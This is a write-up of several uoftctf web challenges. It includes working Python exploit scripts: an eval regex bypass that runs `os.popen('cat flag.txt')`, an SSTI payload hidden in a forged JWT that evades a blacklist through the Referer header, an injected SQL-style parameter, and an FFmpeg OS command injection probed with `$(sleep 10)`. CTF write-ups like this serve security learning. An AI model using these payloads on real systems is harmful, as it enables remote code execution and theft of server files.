| Name       | uoftctf                |
|------------|------------------------|
| URL        | [https://play.uoftctf.org/](https://play.uoftctf.org/) |
| Category   | Web                    |
| Discord    | [https://discord.com/invite/VAwyzVUt?utm_source=Discord%20Widget&utm_medium=Connect](https://discord.com/invite/VAwyzVUt?utm_source=Discord%20Widget&utm_medium=Connect) |



# 1. Voice Changer - OS Injection

This website uses FFmpeg to generate an OGG file. In this challenge, an OS injection vulnerability exists in the FFmpeg command.

![OS Injection Image](https://github.com/ACHUX21/Writeups/assets/130113878/322e6697-62b4-4cd8-98a5-86d031085db1)

Let's attempt to induce a delay in the command using `$(sleep 10)`.

![Sleep Command Image](https://github.com/ACHUX21/Writeups/assets/130113878/f7cdcc2c-f1d7-4bb5-aa2c-2ccb9d20d107)

The image reveals a 10-second delay resulting from the execution of the sleep command.

### Exploiting the Vulnerability

To exploit this vulnerability, our approach involves redirecting the flag to our webhook site:

![Webhook Image 1](https://github.com/ACHUX21/Writeups/assets/130113878/cb206e1e-dde5-4c64-8164-0c299ddf5788)

![Webhook Image 2](https://github.com/ACHUX21/Writeups/assets/130113878/4889fc03-f67a-4055-8316-86212077eb6c)

# 2. The Varsity 

### Solution:
To address the issue, generate a valid (JWT) and proceed by sending a POST request to article number 9 with this json {"issue":"9'"}

```python
import requests

url = "https://uoftctf-the-varsity.chals.io:443/register"
json={"username": "achuxer"}
reg = requests.post(url, json=json)

valid_jwt = reg.headers["Set-Cookie"].split("=")[1].split(";")[0]

session = requests.session()

_url = "https://uoftctf-the-varsity.chals.io:443/article"
_cookies = {"token": valid_jwt}
_json={"issue": "9'"}
flag = session.post(_url, cookies=_cookies, json=_json)

print(flag.json()["content"])
```

# No Code - Eval

### Source
```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```
### Solution

Sending \n in the start of your payload cz re.match() will only match at the beginning of the string and not at the beginning of each line.

```python
#!/usr/bin/env python3
import requests
import string,sys
url = 'https://uoftctf-no-code.chals.io/execute'

payload = "\n__import__('os').popen('cat flag.txt').read()"

data = {
    'code': payload
}
response = requests.post(url, data=data)
print(response.text)
```


# Guestbook - Hidden Flag

By reading the html source you can see POST action directed towards a Google Spreadsheet with the parameter "sheetID"

![image](https://github.com/ACHUX21/Writeups/assets/130113878/e5c48610-12d1-4f6f-9dbc-66d4a693d78a)

After googling around,with this id you can obtain spreadsheet docs.

https://docs.google.com/spreadsheets/d/1PGFh37vMWFrdOnIoItnxiGAkIqSxlJDiDyklp9OVtoQ/edit

Following this step, you can notice two hidden rows. Once I copied the doc, I had access to the flag

#  My First App - JWT / SSTI

Solution :
  Initially, you must crack a JWT to reveal the jwt_key. Furthermore, there's an SSTI in the username field from the JWT-cookie, but with certain blacklisted characters/words.
  
  ![image](https://github.com/ACHUX21/Writeups/assets/130113878/ebca8511-d882-427b-aba0-65607fcbb5cd)

  
 ### PY:

  ```python
  #!/usr/bin/env python3
import jwt
import requests
from bs4 import BeautifulSoup

secret_key = 'torontobluejays'
username = """
{{lipsum|attr(request.referrer.split().pop(0))|attr(request.referrer.split().pop(1))(request.referrer.split().pop(2))|attr(request.referrer.split().pop(3))(request.referrer.split().pop(4))|attr(request.referrer.split().pop(5))()}}
"""
pay = """__globals__ __getitem__ os popen cat${IFS}flag.txt read """


def genJWT(username):
    payload = {
        "username": username,
}
    token = jwt.encode(payload, secret_key, algorithm='HS256')
    return token


jwt_token = genJWT(username)
print(jwt_token)

url = "https://uoftctf-my-first-app.chals.io:443/?test="
cookies = {"auth_token": jwt_token}

headers = {"referer": pay}
response = requests.get(url,headers=headers, cookies=cookies)
#response = requests.get(url,headers=headers, cookies=cookies, proxies=proxies)
cont = response.text


s = BeautifulSoup(cont, 'html.parser')
cov = s.find('div', class_='container')

if cov:
    print(cov.prettify())
else:
    print(cont)
```
